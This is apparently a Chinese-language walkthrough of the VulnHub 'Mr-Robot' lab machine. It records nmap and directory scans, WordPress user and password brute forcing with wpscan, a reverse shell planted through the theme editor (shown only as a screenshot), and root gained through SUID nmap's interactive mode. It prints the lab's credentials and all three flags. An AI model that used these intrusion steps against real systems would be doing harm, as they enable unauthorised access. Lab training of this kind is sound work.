## port scan

```shell
# Nmap 7.94SVN scan initiated Wed Nov 13 05:47:12 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 192.168.56.130
Nmap scan report for 192.168.56.130
Host is up (0.0029s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 08:00:27:6D:16:DE (Oracle VirtualBox virtual NIC)
```

```shell
# Nmap 7.94SVN scan initiated Wed Nov 13 05:48:48 2024 as: nmap -sT -sV -sC -O -p22,80 -oN nmap_results/detils_scan 192.168.56.130
Nmap scan report for 192.168.56.130
Host is up (0.0011s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
MAC Address: 08:00:27:6D:16:DE (Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.9 (94%), Linux 3.2 - 3.8 (93%), Linux 3.18 (93%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.16 - 4.6 (91%), Linux 2.6.26 - 2.6.35 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
```

vuln_scan

```shell
# Nmap 7.94SVN scan initiated Wed Nov 13 05:50:21 2024 as: nmap --script=vuln -p22,80 -oN nmap_results/vuln_scan 192.168.56.130
Nmap scan report for 192.168.56.130
Host is up (0.00085s latency).

PORT   STATE  SERVICE
22/tcp closed ssh
80/tcp open   http
| _   Form action: http://192.168.56.130/
|     
|     Path: http://192.168.56.130:80/js/BASE_URL1%22/live/
|     Form id: 
|     Form action: http://192.168.56.130/
|     
|     Path: http://192.168.56.130:80/js/BASE_URL1%22/live/
|     Form id: 
|     Form action: http://192.168.56.130/
|     
|     Path: http://192.168.56.130:80/wp-login.php
|     Form id: loginform
|_    Form action: http://192.168.56.130/wp-login.php
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
MAC Address: 08:00:27:6D:16:DE (Oracle VirtualBox virtual NIC)
```

## web

识别一下

```shell
whatweb http://192.168.56.131
```

apache服务

![image-20241114112127207](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241114112127207.png)

`wordpress`4.3.1

`wpscan`扫描，枚举用户一个没有

```shell
wpscan --url http://192.168.56.131 -e u
```

目录扫描

```shell
dirsearch -u http://192.168.56.131/
```

```
200   614B   http://192.168.56.130/admin/
200   677B   http://192.168.56.130/admin/index
200   677B   http://192.168.56.130/admin/index.html
200     0B   http://192.168.56.130/favicon.ico
200   504KB  http://192.168.56.130/intro
200   158B   http://192.168.56.130/license
200   158B   http://192.168.56.130/license.txt
200    64B   http://192.168.56.130/readme
200    64B   http://192.168.56.130/readme.html
200    41B   http://192.168.56.130/robots.txt
200     0B   http://192.168.56.130/sitemap
200     0B   http://192.168.56.130/sitemap.xml
200     0B   http://192.168.56.130/sitemap.xml.gz
200    21B   http://192.168.56.130/wp-admin/admin-ajax.php
200     0B   http://192.168.56.130/wp-config.php
200     0B   http://192.168.56.130/wp-content/
200     0B   http://192.168.56.130/wp-content/plugins/google-sitemap-generator/sitemap-core.php
200     0B   http://192.168.56.130/wp-cron.php
200     1KB  http://192.168.56.130/wp-login
200     1KB  http://192.168.56.130/wp-login.php
200     1KB  http://192.168.56.130/wp-login/
```

```shell
┌──(root㉿kali)-[~/vulnhub/Mr-robot]
└─# curl http://192.168.56.131/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

`key-1-of-3.txt`:`073403c8a58a1f80d943455fb30724b9`

`fsocity.dic`是一个字典，可能是用户密码

去重一下

```shell
┌──(root㉿kali)-[~/vulnhub/Mr-robot]
└─# cat fsocity.dic|sort | uniq > pass.txt                     
                                                                                                                                                                          
┌──(root㉿kali)-[~/vulnhub/Mr-robot]
└─# wc -l pass.txt                         
11451 pass.txt
```

先去爆破用户名，因为用户名存不存在返回包的长度不一样的

![image-20241114122152351](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241114122152351.png)

`Elliot`用户是存在的，接着爆破密码

```shell
wpscan --url http://192.168.56.131 -U Elliot -P pass.txt
```

![image-20241114122747488](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241114122747488.png)

`Username: Elliot, Password: ER28-0652`

## reverse shell

可以编辑主题的文件，直接写个php反弹shell

![image-20241114123029355](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241114123029355.png)

随便访问不存在的页面会触发404.php

robot家目录，有一个md5:`robot:c3fcd3d76192e4007dfb496cca67e13b`

爆破密码得：`abcdefghijklmnopqrstuvwxyz`

切换用户

```shell
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

## SUID提权

查找suid权限的文件

```shell
robot@linux:~$ find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
```

有`nmap`可以用

```shell
robot@linux:~$ nmap -V
nmap -V

nmap version 3.81
```

版本是3.81，可以拿到一个交互式的shell

> 2.02 - 5.21版本可以通过`nmap --interactive`拿到交互式shell

![image-20241114124012350](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241114124012350.png)

```shell
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !bash -p
!bash -p
bash-4.3# whoami
whoami
root
bash-4.3# cd /root
cd /root
bash-4.3# ls
ls
firstboot_done  key-3-of-3.txt
bash-4.3# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

